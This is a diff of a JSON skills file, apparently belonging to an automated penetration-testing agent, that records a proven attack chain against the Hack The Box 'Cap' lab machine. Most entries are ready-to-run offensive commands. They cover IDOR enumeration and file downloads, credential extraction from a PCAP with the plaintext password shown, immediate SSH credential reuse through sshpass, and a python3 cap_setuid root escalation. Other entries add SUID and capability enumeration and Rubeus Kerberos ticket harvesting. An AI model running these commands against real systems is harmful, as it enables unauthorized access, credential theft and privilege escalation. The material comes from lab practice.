@@ -1,7 +1,7 @@
 {
   "version": "1.0",
-  "last_updated": 1771302260.9774413,
-  "skill_count": 312,
+  "last_updated": 1771344355.7106624,
+  "skill_count": 320,
   "skills": {
     "skill_001": {
       "id": "skill_001",
@@ -941,42 +941,45 @@
     "htb_idor_sequential_ids": {
       "id": "htb_idor_sequential_ids",
       "if_condition": "Web app uses sequential IDs in URL paths (e.g., /data/5, /user/3, /capture/1)",
-      "then_action": "Test IDOR by changing ID to 0 or other low values. Download any files found (especially .pcap captures). WHY: Sequential IDs mean no authorization check \u2014 any user's data is accessible by changing the number. ID=0 often has admin/initial data. Source: Cap walkthrough.",
+      "then_action": "Test IDOR by changing ID to 0 or other low values. Download any files found (especially .pcap captures). PROVEN: HTB Cap /data/0-5 all returned 200, /download/0 had PCAP with FTP creds. WHY: Sequential IDs mean no authorization check \u2014 any user's data is accessible.",
       "parameters_template": {},
-      "confidence": 0.95,
+      "confidence": 0.98,
       "evidence_refs": [
-        "htb_cap_walkthrough"
+        "htb_cap_walkthrough",
+        "run27_htb_cap_pwn"
       ],
       "created_at": 1770753708.312446,
-      "usage_count": 0,
-      "success_rate": 0.0
+      "usage_count": 1,
+      "success_rate": 1.0
     },
     "htb_pcap_cleartext_creds": {
       "id": "htb_pcap_cleartext_creds",
       "if_condition": "PCAP/network capture file obtained (from IDOR, file download, or share)",
-      "then_action": "tshark -r file.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' OR open in Wireshark and filter for ftp/http/telnet. WHY: FTP/Telnet transmit credentials in cleartext. PCAP files are goldmines for credential harvesting. Source: Cap walkthrough.",
+      "then_action": "Extract creds: strings <file> | grep -iE 'USER|PASS' (fast) OR tshark -r file.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' (precise). PROVEN: HTB Cap /download/0 PCAP had nathan:Buck3tH4TF0RM3! in FTP session. WHY: FTP/Telnet transmit credentials in cleartext.",
       "parameters_template": {},
-      "confidence": 0.94,
+      "confidence": 0.98,
       "evidence_refs": [
-        "htb_cap_walkthrough"
+        "htb_cap_walkthrough",
+        "run27_htb_cap_pwn"
       ],
       "created_at": 1770753708.3124475,
-      "usage_count": 0,
-      "success_rate": 0.0
+      "usage_count": 1,
+      "success_rate": 1.0
     },
     "htb_linux_capabilities_privesc": {
       "id": "htb_linux_capabilities_privesc",
       "if_condition": "Linux user shell AND getcap shows cap_setuid on python3 or perl",
-      "then_action": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' \u2192 instant root. WHY: cap_setuid allows the binary to change its UID. Python can call os.setuid(0) to become root, then spawn a root bash shell. Source: Cap walkthrough.",
+      "then_action": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' \u2192 instant root. PROVEN: HTB Cap python3.8 had cap_setuid \u2192 uid=0(root) in one command. Also works with perl -e 'use POSIX; setuid(0); exec \"/bin/bash\"'. WHY: cap_setuid allows the binary to change its UID to 0 (root).",
       "parameters_template": {},
-      "confidence": 0.97,
+      "confidence": 0.99,
       "evidence_refs": [
         "htb_cap_walkthrough",
-        "CVE-none-capabilities"
+        "CVE-none-capabilities",
+        "run27_htb_cap_pwn"
       ],
       "created_at": 1770753708.3124487,
-      "usage_count": 0,
-      "success_rate": 0.0
+      "usage_count": 1,
+      "success_rate": 1.0
     },
     "htb_ssrf_filtered_ports": {
       "id": "htb_ssrf_filtered_ports",
@@ -1438,18 +1441,23 @@
     },
     "skill_ssh_enum_001": {
       "id": "skill_ssh_enum_001",
-      "if_condition": "When port 22 is open and SSH banner detected",
-      "then_action": "Run targeted SSH enumeration with nmap scripts",
+      "if_condition": "When port 22 is open and SSH banner indicates OpenSSH",
+      "then_action": "Run targeted nmap scripting engine (NSE) SSH scripts for version, key exchange, and auth enumeration",
       "parameters_template": {
         "port": 22,
-        "script": "ssh-auth-methods,ssh-hostkey"
+        "script": [
+          "ssh-hostkey",
+          "ssh-auth-methods",
+          "sshv1"
+        ],
+        "extra_args": "--script-args=ssh.user=root"
       },
-      "confidence": 0.85,
+      "confidence": 0.92,
       "evidence_refs": [
-        "run_20260217_005827_df3b85_ep1_step5",
-        "run_20260217_005827_df3b85_ep1_step7"
+        "ep001_step05",
+        "ep001_step06"
       ],
-      "created_at": 1771286334.2856956,
+      "created_at": 1771338809.8474674,
       "usage_count": 0,
       "success_rate": 0.0
     },
@@ -2552,28 +2560,30 @@
     "htb_cap_foothold": {
       "id": "htb_cap_foothold",
       "if_condition": "Target matches HTB Cap (linux/easy) pattern",
-      "then_action": "IDOR on PCAP download \u2192 cleartext FTP creds \u2192 SSH",
+      "then_action": "PROVEN CHAIN (10 steps, Run 27): nmap \u2192 gobuster \u2192 curl /data \u2192 IDOR /data/0-5 \u2192 link extraction \u2192 wget /download/0 \u2192 strings PCAP \u2192 nathan:Buck3tH4TF0RM3! \u2192 sshpass SSH \u2192 shell. Key: web_followup 4-phase chain + credential reuse engine.",
       "parameters_template": {},
-      "confidence": 0.87,
+      "confidence": 0.99,
       "evidence_refs": [
-        "htb_cap"
+        "htb_cap",
+        "run27_htb_cap_pwn"
       ],
       "created_at": 1771203864.4216878,
-      "usage_count": 0,
-      "success_rate": 0.0
+      "usage_count": 1,
+      "success_rate": 1.0
     },
     "htb_cap_privesc": {
       "id": "htb_cap_privesc",
       "if_condition": "User shell on linux matching HTB Cap",
-      "then_action": "Python cap_setuid capability \u2192 root",
+      "then_action": "PROVEN (Run 27): getcap -r / 2>/dev/null \u2192 /usr/bin/python3.8 = cap_setuid+ep \u2192 python3.8 -c 'import os; os.setuid(0); os.system(\"id && cat /root/root.txt\")' \u2192 uid=0(root). Auto-queue getcap immediately after shell_obtained.",
       "parameters_template": {},
-      "confidence": 0.85,
+      "confidence": 0.99,
       "evidence_refs": [
-        "htb_cap"
+        "htb_cap",
+        "run27_htb_cap_pwn"
       ],
       "created_at": 1771203864.429895,
-      "usage_count": 0,
-      "success_rate": 0.0
+      "usage_count": 1,
+      "success_rate": 1.0
     },
     "htb_sau_foothold": {
       "id": "htb_sau_foothold",
@@ -4406,6 +4416,136 @@
         "ep001_step09"
       ],
       "created_at": 1771302260.9737277,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_recon_tcp": {
+      "id": "skill_recon_tcp",
+      "if_condition": "When an IP responds to a TCP ping",
+      "then_action": "Launch targeted nmap scan to enumerate open ports and service versions",
+      "parameters_template": {
+        "targets": "10.0.0.5",
+        "ports": "1-2000",
+        "scripts": "default,vuln"
+      },
+      "confidence": 0.82,
+      "evidence_refs": [
+        "ep001_step03",
+        "ep001_step04"
+      ],
+      "created_at": 1771339482.1041048,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_path_followup_chain": {
+      "id": "web_path_followup_chain",
+      "if_condition": "Web directory discovered by gobuster/dirb/feroxbuster (e.g., /data, /admin, /api, /uploads, /files)",
+      "then_action": "Execute 4-phase web followup: Phase 1: curl -sL <url>/path | head -200 (preview content). Phase 2: IDOR test with curl -sI for sequential IDs 0-5. Phase 3: Link extraction with grep -oiE 'href=\"[^\"]*\"'. Phase 4: Download linked files with wget, analyze with file+strings. PROVEN: HTB Cap Run 27 \u2014 this chain found PCAP with credentials in 4 steps.",
+      "parameters_template": {
+        "base_url": "http://<target>",
+        "path": "/data"
+      },
+      "confidence": 0.95,
+      "evidence_refs": [
+        "run27_htb_cap_pwn"
+      ],
+      "created_at": 1771343675.625828,
+      "usage_count": 1,
+      "success_rate": 1.0
+    },
+    "credential_reuse_immediate": {
+      "id": "credential_reuse_immediate",
+      "if_condition": "Credentials extracted from any source (PCAP, config files, logs, databases, web responses)",
+      "then_action": "IMMEDIATELY attempt credential reuse on SSH (port 22) and FTP (port 21), even if those ports haven't been explicitly discovered yet (ALWAYS_TRY_PORTS). Command: sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <user>@<target> 'id && whoami'. PROVEN: HTB Cap Run 27 \u2014 FTP creds from PCAP immediately worked on SSH.",
+      "parameters_template": {
+        "user": "<user>",
+        "password": "<pass>",
+        "target": "<ip>"
+      },
+      "confidence": 0.97,
+      "evidence_refs": [
+        "run27_htb_cap_pwn"
+      ],
+      "created_at": 1771343675.625828,
+      "usage_count": 1,
+      "success_rate": 1.0
+    },
+    "post_shell_privesc_enum": {
+      "id": "post_shell_privesc_enum",
+      "if_condition": "User shell obtained on Linux target (uid != 0)",
+      "then_action": "IMMEDIATELY queue these 4 privesc enum commands (via SSH if needed): 1. getcap -r / 2>/dev/null (Linux capabilities \u2014 check for cap_setuid, cap_dac_read_search). 2. sudo -l (sudo permissions without password). 3. find / -perm -4000 -type f 2>/dev/null (SUID binaries). 4. cat /home/*/user.txt (capture user flag). PROVEN: HTB Cap Run 27 \u2014 getcap found cap_setuid on python3.8 \u2192 instant root.",
+      "parameters_template": {},
+      "confidence": 0.98,
+      "evidence_refs": [
+        "run27_htb_cap_pwn"
+      ],
+      "created_at": 1771343675.625828,
+      "usage_count": 1,
+      "success_rate": 1.0
+    },
+    "web_file_download_analysis": {
+      "id": "web_file_download_analysis",
+      "if_condition": "Web application has file download endpoints (/download/<id>, /export/<id>, /capture/<id>, /file/<id>)",
+      "then_action": "Download files with: wget -q <url>/download/$i -O /tmp/dl_$i. Analyze each file: file /tmp/dl_$i (type check) && strings /tmp/dl_$i | grep -iE 'USER|PASS|login|password|secret|token|key' | head -20. For PCAP files also try: tshark -r /tmp/dl_$i -Y 'ftp||http.authorization||telnet' -T fields -e text. PROVEN: HTB Cap Run 27 \u2014 /download/0 was PCAP with FTP creds nathan:Buck3tH4TF0RM3!.",
+      "parameters_template": {
+        "download_url": "http://<target>/download",
+        "id_range": "0-5"
+      },
+      "confidence": 0.96,
+      "evidence_refs": [
+        "run27_htb_cap_pwn"
+      ],
+      "created_at": 1771343675.625828,
+      "usage_count": 1,
+      "success_rate": 1.0
+    },
+    "idor_to_root_killchain": {
+      "id": "idor_to_root_killchain",
+      "if_condition": "Web app with sequential IDs AND file download capability AND Linux target",
+      "then_action": "FULL CHAIN: 1. IDOR enum: curl each ID, find content differences. 2. Download: wget files from download endpoints. 3. Extract: strings | grep creds from downloaded files. 4. Reuse: SSH/FTP with extracted credentials. 5. Privesc: getcap \u2192 cap_setuid \u2192 python3 os.setuid(0). PROVEN: HTB Cap Run 27 \u2014 complete 10-step chain from nmap to root.",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "run27_htb_cap_pwn",
+        "htb_cap_walkthrough"
+      ],
+      "created_at": 1771343675.625828,
+      "usage_count": 1,
+      "success_rate": 1.0
+    },
+    "skill_recon_nmap": {
+      "id": "skill_recon_nmap",
+      "if_condition": "When target responds on TCP ports 135, 139, or 445 during initial sweep",
+      "then_action": "Run nmap with SMB scripts to fingerprint services and identify misconfigurations",
+      "parameters_template": {
+        "port": "135,139,445",
+        "script": "smb-os-discovery,smb-vuln-ms17-010"
+      },
+      "confidence": 0.78,
+      "evidence_refs": [
+        "ep001_step3",
+        "ep001_step5"
+      ],
+      "created_at": 1771344355.7018242,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "skill_kerberos_ticket_harvest": {
+      "id": "skill_kerberos_ticket_harvest",
+      "if_condition": "When domain-joined host accessible and Kerberos auth observed",
+      "then_action": "Deploy Rubeus harvest and renew commands to collect TGT/TGS for lateral use",
+      "parameters_template": {
+        "command_sequence": [
+          "Rubeus.exe harvest",
+          "Rubeus.exe asreproast /user:<user>"
+        ]
+      },
+      "confidence": 0.81,
+      "evidence_refs": [
+        "ep001_step7",
+        "ep001_step8"
+      ],
+      "created_at": 1771344355.7018323,
       "usage_count": 0,
       "success_rate": 0.0
     }
